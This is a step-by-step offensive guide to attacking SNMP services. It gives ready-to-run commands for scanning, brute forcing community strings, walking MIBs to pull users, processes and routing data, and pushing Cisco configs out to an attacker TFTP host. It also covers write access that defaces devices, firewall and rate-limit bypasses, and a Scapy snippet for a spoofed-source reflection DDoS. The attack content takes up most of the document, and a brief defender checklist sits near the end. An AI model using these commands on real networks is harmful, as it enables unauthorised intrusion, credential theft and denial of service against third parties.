# Port 161/162 - SNMP (Simple Network Management Protocol) - Complete Attack Guide

## 📖 Overview

**Protocol**: SNMP (Simple Network Management Protocol)
**Ports**: 161 (SNMP), 162 (SNMP Trap)
**Transport**: UDP
**Encryption**: SNMPv3 (optional), SNMPv1/v2c (plaintext)
**Authentication**: Community strings (v1/v2c), User-based (v3)

## 🎯 Attack Objectives

- **Community String Brute Force**: Discover public/private strings
- **Information Gathering**: Extract device configuration
- **Network Mapping**: Discover all SNMP devices
- **Device Enumeration**: List users, processes, services
- **Configuration Extraction**: Dump running configs
- **MIB Walking**: Extract all SNMP data

## 🔍 Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect SNMP Service**
```bash
# Quick UDP scan
nmap -sU -p 161,162 192.168.1.100

# SNMP version detection
nmap -sU -p 161 --script snmp-info 192.168.1.100

# Network-wide discovery
nmap -sU -p 161 192.168.1.0/24 --open

# Comprehensive SNMP scripts
nmap -sU -p 161 --script snmp-* 192.168.1.100
```

**1.2 Version Detection**
```bash
# Detect SNMP version
nmap -sU -p 161 --script snmp-info 192.168.1.100

# Using snmpwalk
snmpwalk -v 1 -c public 192.168.1.100 system
snmpwalk -v 2c -c public 192.168.1.100 system
snmpwalk -v 3 -u username -l authPriv 192.168.1.100 system
```

**1.3 Quick Test**
```bash
# Test if SNMP is accessible
snmpget -v 2c -c public 192.168.1.100 SNMPv2-MIB::sysDescr.0

# Using onesixtyone
onesixtyone 192.168.1.100 public

# Mass scan
onesixtyone -c community.txt 192.168.1.0/24
```

### Phase 2: Community String Attacks

**2.1 Default Community Strings**
```bash
# Common defaults
public          # Read-only (most common)
private         # Read-write
manager
admin
password
community
snmp
monitor
cisco
default
secret

# Vendor-specific
cable-docsis    # Cable modems
ILMI            # ATM devices
c0de            # Some routers
```

**2.2 Brute Force Community Strings**

**Using onesixtyone** (Recommended - Fast):
```bash
# Single target
onesixtyone -c community.txt 192.168.1.100

# Network scan
onesixtyone -c community.txt -i targets.txt

# Custom list
cat > community.txt << EOF
public
private
manager
admin
cisco
EOF
onesixtyone -c community.txt 192.168.1.0/24

# Wait between attempts
onesixtyone -c community.txt -w 10 192.168.1.100
```

**Using Hydra**:
```bash
# Brute force (slower but thorough)
hydra -P community.txt snmp://192.168.1.100

# Verbose mode
hydra -P community.txt snmp://192.168.1.100 -V
```

**Using Metasploit**:
```bash
msfconsole
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
set PASS_FILE /usr/share/wordlists/metasploit/snmp_default_pass.txt
run
```

**Using Nmap**:
```bash
# Brute force community strings
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=community.txt 192.168.1.100
```

**2.3 SNMPv3 Authentication Attacks**
```bash
# SNMPv3 uses username/password
# Brute force SNMPv3
hydra -L users.txt -P passwords.txt snmp://192.168.1.100 -s 161

# Using Metasploit
use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS 192.168.1.100
run
```

### Phase 3: Information Gathering

**3.1 SNMP Walk (Extract All Data)**
```bash
# Walk entire MIB tree (SNMPv1)
snmpwalk -v 1 -c public 192.168.1.100

# SNMPv2c (more data)
snmpwalk -v 2c -c public 192.168.1.100

# Specific OID
snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.2.1.1

# Save output
snmpwalk -v 2c -c public 192.168.1.100 > snmp_dump.txt

# Using Nmap
nmap -sU -p 161 --script snmp-win32-software,snmp-processes,snmp-interfaces 192.168.1.100
```

**3.2 System Information**
```bash
# System description
snmpget -v 2c -c public 192.168.1.100 SNMPv2-MIB::sysDescr.0

# System name
snmpget -v 2c -c public 192.168.1.100 SNMPv2-MIB::sysName.0

# System uptime
snmpget -v 2c -c public 192.168.1.100 SNMPv2-MIB::sysUpTime.0

# System location
snmpget -v 2c -c public 192.168.1.100 SNMPv2-MIB::sysLocation.0

# System contact
snmpget -v 2c -c public 192.168.1.100 SNMPv2-MIB::sysContact.0

# All system info
snmpwalk -v 2c -c public 192.168.1.100 system
```

**3.3 Network Information**
```bash
# Network interfaces
snmpwalk -v 2c -c public 192.168.1.100 interfaces

# IP addresses
snmpwalk -v 2c -c public 192.168.1.100 ipAddrTable

# Routing table
snmpwalk -v 2c -c public 192.168.1.100 ipRouteTable

# ARP table
snmpwalk -v 2c -c public 192.168.1.100 ipNetToMediaTable

# TCP connections
snmpwalk -v 2c -c public 192.168.1.100 tcpConnTable

# UDP connections
snmpwalk -v 2c -c public 192.168.1.100 udpTable

# Using Nmap
nmap -sU -p 161 --script snmp-interfaces,snmp-netstat 192.168.1.100
```

**3.4 Enumerate Users and Processes**
```bash
# Windows users (if Windows device)
snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.4.1.77.1.2.25

# Running processes
snmpwalk -v 2c -c public 192.168.1.100 hrSWRunName

# Process parameters
snmpwalk -v 2c -c public 192.168.1.100 hrSWRunPath

# Using Nmap
nmap -sU -p 161 --script snmp-processes 192.168.1.100
nmap -sU -p 161 --script snmp-win32-users 192.168.1.100
```

**3.5 Storage and File System**
```bash
# Storage information
snmpwalk -v 2c -c public 192.168.1.100 hrStorageDescr

# Installed software (Windows)
snmpwalk -v 2c -c public 192.168.1.100 hrSWInstalledName

# Using Nmap
nmap -sU -p 161 --script snmp-win32-software 192.168.1.100
```

### Phase 4: Automated Enumeration

**4.1 Using snmp-check**
```bash
# Comprehensive enumeration
snmp-check 192.168.1.100

# Specific community string
snmp-check -c private 192.168.1.100

# Write to file
snmp-check -c public 192.168.1.100 > snmp_enum.txt
```

**4.2 Using enum4linux** (for Windows)
```bash
# SNMP enumeration included
enum4linux -a 192.168.1.100
```

**4.3 Using Metasploit Modules**
```bash
msfconsole

# General enumeration
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.100
set COMMUNITY public
run

# Enumerate users
use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS 192.168.1.100
run

# Enumerate shares
use auxiliary/scanner/snmp/snmp_enumshares
set RHOSTS 192.168.1.100
run
```

**4.4 Using Nmap NSE Scripts**
```bash
# All SNMP scripts
nmap -sU -p 161 --script snmp-* 192.168.1.100

# Specific useful scripts
nmap -sU -p 161 --script snmp-brute,snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users 192.168.1.100
```

### Phase 5: Configuration Extraction

**5.1 Cisco Device Configuration**
```bash
# Requires private/write community string

# Show running-config
snmpwalk -v 2c -c private 192.168.1.100 1.3.6.1.4.1.9.2.1.55

# TFTP config upload
snmpset -v 2c -c private 192.168.1.100 .1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1

# Download via TFTP
# OID: 1.3.6.1.4.1.9.9.96.1.1.1

# Using Metasploit
use auxiliary/scanner/snmp/cisco_config_tftp
set RHOSTS 192.168.1.100
set COMMUNITY private
set LHOST attacker_ip
run
```

**5.2 Extract Credentials**
```bash
# Windows user accounts
snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.4.1.77.1.2.25

# Password hashes (if exposed)
snmpwalk -v 2c -c public 192.168.1.100 | grep -i password

# VPN credentials (some devices)
snmpwalk -v 2c -c public 192.168.1.100 | grep -i vpn
```

### Phase 6: Exploitation

**6.1 SNMP Write Access (if private string found)**
```bash
# Change system name
snmpset -v 2c -c private 192.168.1.100 SNMPv2-MIB::sysName.0 s "HACKED"

# Change system location
snmpset -v 2c -c private 192.168.1.100 SNMPv2-MIB::sysLocation.0 s "Pwned"

# Modify routing table (dangerous!)
# Can redirect traffic

# Create TFTP upload
# Force device to upload config to attacker TFTP
```

**6.2 SNMP Reflection Attack (DDoS)**
```bash
# Amplification factor: up to 650x
# Send small request, get large GetBulk response

# Using Scapy
from scapy.all import *

# Craft SNMP GetBulkRequest (spoofed source)
packet = IP(src="victim_ip", dst="open_snmp_server")/UDP(dport=161)/SNMP(PDU=SNMPbulk(max_repetitions=100))

send(packet, loop=1)

# Server responds with large data to victim
```

**6.3 Using Extended OIDs**
```bash
# Extended MIBs can execute commands on some devices
# Cisco IOS example (old versions)

# Execute command (requires private string)
snmpset -v 2c -c private 192.168.1.100 [specific_OID] s "command"

# Very device/vendor specific
```

## 🛡️ Bypass Techniques

### Bypassing Firewalls
```bash
# SNMP often allowed from management networks
# If you compromise management host, SNMP access likely available

# Source port manipulation
nmap -sU -p 161 --source-port 53 192.168.1.100

# Fragmentation
nmap -sU -p 161 -f 192.168.1.100
```

### Bypassing Rate Limiting
```bash
# Slow community string brute force
onesixtyone -c community.txt -w 60 192.168.1.100

# Distribute across multiple sources
# Use multiple attacking IPs
```

## 📊 Information Extraction Summary

**Critical OIDs to Query**:
```bash
# System info
1.3.6.1.2.1.1                  # System group
1.3.6.1.2.1.1.1.0             # System description
1.3.6.1.2.1.1.3.0             # System uptime
1.3.6.1.2.1.1.5.0             # System name
1.3.6.1.2.1.1.6.0             # System location

# Network info
1.3.6.1.2.1.2                  # Interfaces
1.3.6.1.2.1.4.20.1.1          # IP addresses
1.3.6.1.2.1.4.21.1.1          # Routing table
1.3.6.1.2.1.4.22.1.2          # ARP table

# Processes
1.3.6.1.2.1.25.4.2.1.2        # Running processes

# Windows users
1.3.6.1.4.1.77.1.2.25         # User accounts

# Storage
1.3.6.1.2.1.25.2.3.1.3        # Storage description
```

## 🔐 Security Recommendations

**For Defenders**:
1. **Disable SNMP** - If not needed
2. **Change Default Strings** - Never use "public"/"private"
3. **Use SNMPv3** - Encryption and authentication
4. **Restrict Access** - ACLs limiting source IPs
5. **Read-Only** - Never use write strings if not needed
6. **Monitor SNMP Traffic** - Detect brute force
7. **Network Segmentation** - SNMP on management VLAN only
8. **Disable v1/v2c** - Use v3 only if possible
9. **Complex Strings** - Long, random community strings
10. **Regular Audits** - Review SNMP configuration

## ⚠️ Common Mistakes

**Attacker Mistakes**:
1. Forgetting UDP - SNMP uses UDP not TCP
2. Not trying default strings first
3. Missing SNMPv3 enumeration
4. Not extracting full MIB tree

**Defender Mistakes**:
1. Default "public" string - Most common
2. SNMP v1/v2c enabled - No encryption
3. No access control - Open to anyone
4. SNMP from internet - Critical exposure
5. Write access enabled - Allows modification

## 🎯 Practical Attack Scenario

```bash
# Phase 1: Discovery
nmap -sU -p 161 192.168.1.0/24 --open
# Found 15 SNMP devices

# Phase 2: Try default string
snmpwalk -v 2c -c public 192.168.1.100 system
# SUCCESS! Public string works

# Phase 3: Full enumeration
snmp-check -c public 192.168.1.100 > device_info.txt

# Phase 4: Extract sensitive data
snmpwalk -v 2c -c public 192.168.1.100 > full_dump.txt

# Found:
# - Network topology (routing table)
# - All IP addresses
# - Running processes
# - System details
# - ARP table (MAC addresses)

# Phase 5: Try write access
onesixtyone -c community.txt 192.168.1.100
# Found "private" string!

# Phase 6: Extract config (Cisco)
use auxiliary/scanner/snmp/cisco_config_tftp
# Downloaded full router config with passwords!

# Result: Complete network compromise
```

## 📚 Tools Summary

**Best Tool for Each Task**:
- **Discovery**: Nmap (UDP scan)
- **Brute Force**: onesixtyone (fastest)
- **Enumeration**: snmp-check, snmpwalk
- **Automated**: Metasploit modules
- **Comprehensive**: Nmap NSE scripts

## 🔗 Related Attacks

- **Port 80/443**: Often reveals SNMP strings in web configs
- **Port 22**: SSH may use same passwords as SNMP
- **Port 161 → Full Network Map**: SNMP reveals all devices
- **Cisco Devices**: SNMP config can expose enable passwords

---

**Last Updated**: 2026-06-16
